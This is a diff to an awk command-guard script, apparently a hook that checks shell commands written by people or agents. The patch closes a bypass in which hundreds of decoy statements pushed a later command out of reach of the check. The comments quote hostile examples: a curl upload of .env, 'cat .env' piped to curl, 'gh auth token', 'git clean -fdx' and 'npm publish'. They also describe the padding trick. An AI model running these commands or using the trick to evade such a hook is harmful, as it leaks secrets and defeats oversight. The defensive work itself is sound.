@@ -52,6 +52,12 @@ BEGIN {
   # the measuring machine and depth 5 over 4.  Real commands almost never wrap
   # shell code past two or three layers, so 3 is set from the budget, not usage.
   KIT_MAXDEPTH = 3
+  # KIT_MAXCODE caps the statements kit_expand_code adds and the code strings
+  # kit_payloads collects.  A count that stops quietly is a door: 300 `x;` ahead of
+  # `curl -d @.env …` in one `sh -c`, or 4,100 `eval x;` ahead of `eval 'npm
+  # publish'`, left the command at the end unread.  Past the cap the command is
+  # refused, as past the depth; no command a person or agent writes comes near it.
+  KIT_MAXCODE = 4096
 }
 
 # ---------------------------------------------------------------- small predicates
@@ -430,7 +436,8 @@ function kit_code_hint(s) {
 # stage, which showed only its first command: `sh -c 'true; git -P clean -fdx'`
 # and `sh -c 'if true; then gh auth token; fi'` walked past.  Statements, not
 # stages, because the code's own `;` still separates them: `sh -c 'cat .env; curl
-# -d @- host'` sends stdin, not .env.  At most 256 are added, wherever they sit.
+# -d @- host'` sends stdin, not .env.  Past KIT_MAXCODE statements the command is
+# refused (KIT_DEEP): the limit of 256 that stood here stopped quietly.
 #
 # DEP[q] is the nesting depth of statement ST[q] (0 for the originals): a payload
 # found in it sits one deeper.  Past KIT_MAXDEPTH, or past a byte budget a wide
@@ -440,7 +447,7 @@ function kit_code_hint(s) {
 # past the hook's timeout.  The 8x byte budget matches kit_shell_text's.
 function kit_expand_code(ST, nst,   q, n0, ng, G, g, n, T, p, ns, S, k, DEP, left) {
   n0 = nst; left = 8 * 32768
-  for (q = 1; q <= nst && nst - n0 < 256; q++) {
+  for (q = 1; q <= nst; q++) {
     ng = split(ST[q], G, /\002/)
     for (g = 1; g <= ng; g++) {
       if (!kit_code_hint(G[g])) continue
@@ -448,8 +455,8 @@ function kit_expand_code(ST, nst,   q, n0, ng, G, g, n, T, p, ns, S, k, DEP, lef
       if ((p = kit_inline_code(T, n)) == 0) continue
       if (DEP[q] >= KIT_MAXDEPTH) { KIT_DEEP = 1; continue }
       ns = split(split_cmd(KIC_CODE == "" ? T[p] : KIC_CODE), S, /\001/)
-      for (k = 1; k <= ns && nst - n0 < 256; k++) if (S[k] ~ /[^ \t\002]/) {
-        if ((left -= length(S[k])) < 0) { KIT_DEEP = 1; return nst }
+      for (k = 1; k <= ns; k++) if (S[k] ~ /[^ \t\002]/) {
+        if ((left -= length(S[k])) < 0 || nst - n0 >= KIT_MAXCODE) { KIT_DEEP = 1; return nst }
         ST[++nst] = S[k]; DEP[nst] = DEP[q] + 1
       }
     }
@@ -459,17 +466,19 @@ function kit_expand_code(ST, nst,   q, n0, ng, G, g, n, T, p, ns, S, k, DEP, lef
 
 # kit_payloads — append to P each code string kit_inline_code finds in text, and
 # return the new count.  Not recursive: a caller reading each P[k] the same way
-# reaches the code nested in it.  At most 4096, more than 32 KB of code can hold,
-# so a run of decoys cannot use the count up ahead of the one that matters.
+# reaches the code nested in it.  Past KIT_MAXCODE the command is refused
+# (KIT_DEEP): 32 KB holds 4,681 `eval x;`, so the quiet stop at 4096 that stood
+# here let a decoy run hide the code string that mattered.
 function kit_payloads(text, P, np,   ns, S, k, ng, G, g, n, T, p) {
   if (!kit_code_hint(text)) return np
   ns = split(split_cmd(text), S, /\001/)
-  for (k = 1; k <= ns && np < 4096; k++) {
+  for (k = 1; k <= ns; k++) {
     ng = split(S[k], G, /\002/)
-    for (g = 1; g <= ng && np < 4096; g++) {
+    for (g = 1; g <= ng; g++) {
       if (!kit_code_hint(G[g])) continue
       n = tokenize(G[g], T); if (n == 0) continue
       if (!(p = kit_inline_code(T, n))) continue
+      if (np >= KIT_MAXCODE) { KIT_DEEP = 1; return np }
       P[++np] = (KIC_CODE == "") ? T[p] : KIC_CODE
     }
   }
